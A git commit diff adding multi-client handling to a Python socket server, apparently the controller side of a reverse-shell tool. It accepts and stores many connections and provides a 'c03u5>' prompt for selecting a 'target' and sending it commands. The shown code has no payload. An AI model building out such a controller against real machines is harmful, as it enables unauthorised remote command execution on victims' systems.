c9010bebc5993c599d586814e5bcc0d69031eacf
Aman Srivastava <aman.srivastava999@gmail.com>
2016-06-22 23:01:15 +0530

    Added functions for promt

--- server.py
+++ server.py
@@ -1,5 +1,14 @@
 import socket
 import sys
+import threading
+from queue import Queue
+
+
+NUMBER_OF_THREADS = 2
+JOB_NUMBER = [1, 2]
+queue = Queue()
+all_connections = []
+all_addresses = []
 
 
 # Create socket
@@ -30,13 +39,45 @@ def socket_bind():
         socket_bind()
 
 
-# Establish connection with client
-def socket_accept():
-    conn, address = s.accept()
-    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
-    send_commands(conn)
-    conn.close()
+# # Establish connection with client
+# def socket_accept():
+#     conn, address = s.accept()
+#     print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
+#     send_commands(conn)
+#     conn.close()
 
+# Accept connections from multiple clients and save to list
+def accept_connections():
+    for c in all_connections:
+        c.close()
+    del all_connections[:]
+    del all_addresses[:]
+    while True:
+        try:
+            conn, address = s.accept()
+            conn.setblocking(1)
+            all_connections.append(conn)
+            all_addresses.append(address)
+            print("\n Connection made to " + address[0])
+        except:
+            print("Error in accepting connections")
+
+
+# Interactive promt
+def start_c03u5():
+    while True:
+        cmd = input('c03u5> ')
+        if cmd == 'list':
+            list_connections()
+        elif 'select' in cmd:
+            conn = get_target(cmd)
+            if conn is not None:
+                send_target_commands(conn)
+        else:
+            print("\nThe heck you doin' dude.")
+
+
+# Display all current connections
 
 # Sends commands to client
 def send_commands(conn):
